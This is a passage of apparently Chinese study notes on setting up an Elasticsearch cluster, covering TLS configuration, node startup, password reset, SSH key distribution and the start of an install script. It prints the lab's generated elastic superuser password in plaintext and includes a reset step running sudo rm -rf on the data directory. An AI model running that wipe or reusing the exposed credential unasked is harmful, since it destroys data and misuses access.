class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><span class="hljs-attribute">xpack.security.enrollment.enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><br><span class="hljs-comment"># HTTP 层 TLS</span><br><span class="hljs-attribute">xpack.security.http.ssl</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>  <span class="hljs-attribute">certificate</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1-http.crt</span><br>  <span class="hljs-attribute">key</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1-http.key</span><br>  <span class="hljs-attribute">certificate_authorities</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/ca.crt</span><br>  <span class="hljs-attribute">client_authentication</span><span class="hljs-punctuation">:</span> <span class="hljs-string">none</span><br><br><span class="hljs-comment"># Transport 层 TLS</span><br><span class="hljs-attribute">xpack.security.transport.ssl</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>  <span class="hljs-attribute">verification_mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">certificate</span><br>  <span class="hljs-attribute">certificate</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1.crt</span><br>  <span class="hljs-attribute">key</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1.key</span><br>  <span class="hljs-attribute">certificate_authorities</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/ca.crt</span><br>&quot;&quot;&quot;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：</p><ol><li><code>network.host</code> 和 <code>http.host</code> 常用值<ol><li>见 IP 笔记</li></ol></li></ol></blockquote><hr><h6 id="2-1-15-3-启动第一个-ES"><a href="#2-1-15-3-启动第一个-ES" class="headerlink" title="2.1.15.3. 启动第一个 ES"></a>2.1.15.3. 启动第一个 ES</h6><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 切换 es 用户</span><br>su es<br><br><br><span class="hljs-comment"># 2. 进入 ES 目录</span><br>cd <span class="hljs-symbol">/mystudy/es/elasticsearch</span><br><br><br><span class="hljs-comment"># 3. 启动 ES（初次启动推荐前台启动）</span><br><span class="hljs-comment"># 3.1. 前台启动</span><br>bin<span class="hljs-symbol">/elasticsearch</span><br><br><span class="hljs-comment"># 3.2. 后台启动</span><br>bin<span class="hljs-symbol">/elasticsearch</span> <span class="hljs-operator">-</span>d<br><br><br><span class="hljs-comment"># 4. 保存密码信息</span><br>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━<br>✅ Elasticsearch security features have been automatically configured<span class="hljs-operator">!</span><br>✅ Authentication is enabled and cluster connections are encrypted.<br><br>ℹ️  Password for the elastic user (reset <span class="hljs-keyword">with</span> `bin<span class="hljs-symbol">/elasticsearch-reset-password</span> <span class="hljs-operator">-</span>u elastic`):<br>  dc1hGRVxrQ<span class="hljs-operator">*</span>QR6rozhaJ<br><br><br><br>❌ Unable to generate an enrollment token for Kibana instances, try invoking `bin<span class="hljs-symbol">/elasticsearch-create-enrollment-token</span> <span class="hljs-operator">-</span>s kibana`.<br><br>❌ An enrollment token to enroll new nodes wasn&#x27;t generated. To add nodes and enroll them into this <span class="hljs-params">cluster:</span><br>• On this <span class="hljs-params">node:</span><br>  ⁃ Create an enrollment token <span class="hljs-keyword">with</span> `bin<span class="hljs-symbol">/elasticsearch-create-enrollment-token</span> <span class="hljs-operator">-</span>s node`.<br>  ⁃ Restart Elasticsearch.<br>• On other <span class="hljs-params">nodes:</span><br>  ⁃ Start Elasticsearch <span class="hljs-keyword">with</span> `bin<span class="hljs-symbol">/elasticsearch</span> <span class="hljs-operator">-</span>-enrollment-token <span class="hljs-symbol">&lt;token&gt;</span>`, using the enrollment token that you generated.<br>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━<br><br><br><span class="hljs-comment"># 5. 提取主要内容</span><br>用户名（默认的超级管理员用户）：elastic<br>初始密码：dc1hGRVxrQ<span class="hljs-operator">*</span>QR6rozhaJ<br><br><br><span class="hljs-comment"># 6. 重设 elastic 密码（如果忘记密码或未记录密码，执行此命令将会设置一个随机密码）</span><br>bin<span class="hljs-symbol">/elasticsearch-reset-password</span> <span class="hljs-operator">-</span>u elastic<br><br><br><span class="hljs-comment"># 7. 重设 elastic 密码（适用于已知当前密码的情况，若不记得密码请先通过第 6 步设置随机密码）</span><br>curl <span class="hljs-operator">-</span>k <span class="hljs-operator">-</span>u elastic:<span class="hljs-operator">&lt;</span>当前密码<span class="hljs-operator">&gt;</span> <span class="hljs-operator">-</span>X POST <span class="hljs-string">&quot;https://&lt;本 ES 节点IP&gt;:9200/_security/user/elastic/_password&quot;</span> <span class="hljs-operator">-</span>H &#x27;<span class="hljs-params">Content-Type:</span> application<span class="hljs-operator">/</span>json&#x27; <span class="hljs-operator">-</span>d &#x27;&#123;<br>  <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;&lt;新密码&gt;&quot;</span><br>&#125;&#x27;<br><br><br><span class="hljs-comment"># 8. 补充：如何停止 ES</span><br>ps aux | grep elasticsearch<br><br>kill <span class="hljs-operator">-</span><span class="hljs-number">9</span> <span class="hljs-number">123456</span><br><br><br><span class="hljs-comment"># 9. 补充：如何重置 ES（删除 ES 数据即可）</span><br>sudo rm <span class="hljs-operator">-</span>rf <span class="hljs-operator">/</span>mystudy<span class="hljs-operator">/</span>es<span class="hljs-operator">/</span>elasticsearch<span class="hljs-operator">/</span>data<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure><hr><h6 id="2-1-15-4-访问服务器节点"><a href="#2-1-15-4-访问服务器节点" class="headerlink" title="2.1.15.4. 访问服务器节点"></a>2.1.15.4. 访问服务器节点</h6><p>访问服务器节点，返回下述内容即证明部署成功： <a href="https://192.168.136.8:9200/">https://192.168.136.8:9200</a></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250417090125699.png"></p><hr><h5 id="2-1-16-启动其他-ES"><a href="#2-1-16-启动其他-ES" class="headerlink" title="2.1.16. 启动其他 ES"></a>2.1.16. 启动其他 ES</h5><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-comment"># 1. 修改 ES 配置文件</span><br><span class="hljs-attribute">vim /mystudy/es/elasticsearch/config/elasticsearch.yml</span><br><span class="hljs-attribute">&quot;&quot;&quot;</span><br><span class="hljs-attribute">1. 注意事项</span><br><span class="hljs-attribute">1. 配置内容基本上与第一个节点一致，只需要改这三处</span><br><span class="hljs-attribute">1. 设置节点名称：</span><br><span class="hljs-attribute">1. node.name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">es-nodeX</span><br><span class="hljs-attribute">2. 去掉 cluster.initial_master_nodes</span><br><span class="hljs-attribute">3. TLS 证书配置中，node1 改成nodeX</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">2. 我的写法</span><br><span class="hljs-attribute"># 集群与节点</span><br><span class="hljs-attribute">cluster.name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">es-cluster</span><br><span class="hljs-attribute">node.name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">es-node1</span><br><br><span class="hljs-comment"># 存储路径</span><br><span class="hljs-attribute">path.data</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/data</span><br><span class="hljs-attribute">path.logs</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/log</span><br><br><span class="hljs-comment"># 网络配置</span><br><span class="hljs-attribute">network.host</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">_local_</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">_site_</span><br><span class="hljs-attribute">http.port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">9200</span><br><br><span class="hljs-comment"># 集群发现</span><br><span class="hljs-attribute">discovery.seed_hosts</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.136.8&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.136.9&quot;</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;192.168.136.10&quot;</span><br><br><span class="hljs-comment"># 可选：关闭 GeoIP 自动下载</span><br><span class="hljs-attribute">ingest.geoip.downloader.enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">false</span><br><br><span class="hljs-comment"># 安全配置</span><br><span class="hljs-attribute">xpack.security.enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><span class="hljs-attribute">xpack.security.enrollment.enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><br><span class="hljs-comment"># HTTP 层 TLS</span><br><span class="hljs-attribute">xpack.security.http.ssl</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>  <span class="hljs-attribute">certificate</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1-http.crt</span><br>  <span class="hljs-attribute">key</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1-http.key</span><br>  <span class="hljs-attribute">certificate_authorities</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/ca.crt</span><br>  <span class="hljs-attribute">client_authentication</span><span class="hljs-punctuation">:</span> <span class="hljs-string">none</span><br><br><span class="hljs-comment"># Transport 层 TLS</span><br><span class="hljs-attribute">xpack.security.transport.ssl</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">enabled</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br>  <span class="hljs-attribute">verification_mode</span><span class="hljs-punctuation">:</span> <span class="hljs-string">certificate</span><br>  <span class="hljs-attribute">certificate</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1.crt</span><br>  <span class="hljs-attribute">key</span><span class="hljs-punctuation">:</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/es-node1.key</span><br>  <span class="hljs-attribute">certificate_authorities</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">/mystudy/es/elasticsearch/config/certs/ca.crt</span><br>&quot;&quot;&quot;<br><br><br><span class="hljs-comment"># 2. 切换 es 用户</span><br>su es<br><br><br><span class="hljs-comment"># 3. 进入 ES 目录</span><br>cd /mystudy/es/elasticsearch<br><br><br><span class="hljs-comment"># 4. 启动 Node ES（后台启动）</span><br>bin/elasticsearch -d<br><br><br><span class="hljs-comment"># 5. 访问服务器节点</span><br>https://192.168.136.X:9200/<br></code></pre></td></tr></table></figure><hr><h5 id="2-1-17-脚本大帝"><a href="#2-1-17-脚本大帝" class="headerlink" title="2.1.17. 脚本大帝"></a>2.1.17. 脚本大帝</h5><h6 id="2-1-17-1-步骤"><a href="#2-1-17-1-步骤" class="headerlink" title="2.1.17.1. 步骤"></a>2.1.17.1. 步骤</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 配置 SSH 密钥对认证</span><br><span class="hljs-built_in">sudo</span> ssh-keygen -t rsa -b 4096 -C <span class="hljs-string">&quot;your_email@example.com&quot;</span><br><br>ssh-keyscan -H 192.168.136.9 &gt;&gt; ~/.ssh/known_hosts <br><br>ssh-keyscan -H 192.168.136.10 &gt;&gt; ~/.ssh/known_hosts<br><br>ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.136.9<br><br>ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.136.10<br><br>ssh root@192.168.136.9<br><br><span class="hljs-built_in">exit</span><br><br><br><span class="hljs-comment"># 2. 设置代理，启动 NAT 服务</span><br><span class="hljs-built_in">export</span> http_proxy=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> https_proxy=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> no_proxy=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> HTTP_PROXY=<span class="hljs-variable">$http_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> HTTPS_PROXY=<span class="hljs-variable">$https_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> NO_PROXY=<span class="hljs-variable">$no_proxy</span><br><br><br><span class="hljs-comment"># 3. 创建 /mystudy/es 目录</span><br><span class="hljs-built_in">mkdir</span> -p /mystudy/es<br><br><br><span class="hljs-comment"># 4. 进入 /mystudy/es 目录</span><br><span class="hljs-built_in">cd</span> /mystudy/es<br><br><br><span class="hljs-comment"># 5. 上传 ES 文件到 /mystudy/es 目录</span><br><br><br><span class="hljs-comment"># 6. 创建并编写 Shell 脚本</span><br><span class="hljs-built_in">sudo</span> vim es-shell.sh<br><br><br><span class="hljs-comment"># 7. 添加可执行权限</span><br><span class="hljs-built_in">chmod</span> +x es-shell.sh<br><br><br><span class="hljs-comment"># 8. 安装 dos2unix</span><br><span class="hljs-built_in">command</span> -v dos2unix &gt;/dev/null 2&gt;&amp;1 || <span class="hljs-built_in">sudo</span> apt-get install -y dos2unix<br><br><br><span class="hljs-comment"># 9. 将脚本转为 Unix 格式</span><br>dos2unix es-shell.sh<br><br><br><span class="hljs-comment"># 10. 执行 Shell 脚本</span><br>./es-shell.sh<br><br><br><span class="hljs-comment"># 11. 从 启动第一个 ES 继续向下手动执行</span><br></code></pre></td></tr></table></figure><hr><h6 id="2-1-17-2-脚本精简版"><a href="#2-1-17-2-脚本精简版" class="headerlink" title="2.1.17.2. 脚本精简版"></a>2.1.17.2. 脚本精简版</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># -------------------------------- 开启严格模式 ---------------------------------------------</span><br><span class="hljs-built_in">set</span> -euo pipefail<br><br><span class="hljs-comment"># -------------------------------- 检查是否以 root 权限运行 ---------------------------------------------</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-subst">$(id -u)</span>&quot;</span> != <span class="hljs-string">&quot;0&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;这个脚本需要以 root 用户运行&quot;</span> &gt;&amp;2<br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 声明变量 ---------------------------------------------</span><br><br>work_directory=<span class="hljs-string">&quot;/mystudy/es/elasticsearch&quot;</span><br>es_package=<span class="hljs-string">&quot;elasticsearch-8.18.0-linux-x86_64.tar.gz&quot;</span><br>es_init_name=<span class="hljs-string">&quot;elasticsearch-8.18.0&quot;</span><br><br><span class="hljs-comment"># -------------------------------- 安装 openssl ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 openssl&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 openssl 是否已安装&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v openssl &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;openssl 已安装，跳过安装&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;未检测到 openssl，正在安装...&quot;</span><br>    max_retries=3<br>    retry_count=0<br>    <span class="hljs-keyword">until</span> apt-get install -y openssl; <span class="hljs-keyword">do</span><br>        retry_count=$((retry_count + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$retry_count</span>&quot;</span> -ge <span class="hljs-string">&quot;<span class="hljs-variable">$max_retries</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 openssl 已尝试 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次，仍然失败&quot;</span> &gt;&amp;2<br>            <span class="hljs-built_in">exit</span> 1<br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败，第 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次重试，立即重新尝试...&quot;</span><br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;openssl 安装完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 安装 chrony ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始安装 chrony&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;检查 chrony 是否已安装&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">command</span> -v chronyd &gt;/dev/null 2&gt;&amp;1; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chrony 已安装，跳过安装&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;未检测到 chrony，正在安装...&quot;</span><br>    max_retries=3<br>    retry_count=0<br>    <span class="hljs-keyword">until</span> apt-get update &amp;&amp; apt-get install -y chrony; <span class="hljs-keyword">do</span><br>        retry_count=$((retry_count + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$retry_count</span>&quot;</span> -ge <span class="hljs-string">&quot;<span class="hljs-variable">$max_retries</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装 chrony 已尝试 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次，仍然失败&quot;</span> &gt;&amp;2<br>            <span class="hljs-built_in">exit</span> 1<br>        <span class="hljs-keyword">fi</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装失败，第 <span class="hljs-variable">$&#123;retry_count&#125;</span> 次重试，立即重新尝试...&quot;</span><br>        <span class="hljs-built_in">sleep</span> 2<br>    <span class="hljs-keyword">done</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chrony 安装完成&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># -------------------------------- 时间同步 ---------------------------------------------</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始时间同步&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;正在启动 chrony 服务...&quot;</span><br><span 